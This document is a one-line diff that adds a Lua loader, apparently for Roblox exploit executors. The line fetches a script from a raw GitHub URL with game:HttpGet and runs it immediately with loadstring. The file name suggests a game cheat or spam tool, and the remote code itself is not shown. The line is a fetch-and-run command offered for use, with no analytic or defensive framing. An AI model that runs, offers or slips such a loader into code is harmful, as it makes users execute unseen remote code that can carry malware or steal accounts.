@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/new-mythic-hypershot-spam4-jf9ag54hfic62t.lua"))()
